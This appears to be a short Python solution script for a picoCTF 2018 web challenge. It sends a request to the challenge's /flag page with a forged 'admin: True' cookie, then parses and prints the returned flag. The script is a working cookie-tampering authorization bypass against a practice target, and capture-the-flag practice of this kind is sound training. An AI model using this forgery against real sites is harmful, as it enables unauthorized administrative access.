from requests import *
from bs4 import BeautifulSoup

url = 'http://2018shell.picoctf.com:10573/flag'
cookies = {
    'admin' : 'True'
}
s = Session()
r = s.get(url , cookies=cookies)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('code').get_text()
print(flag)
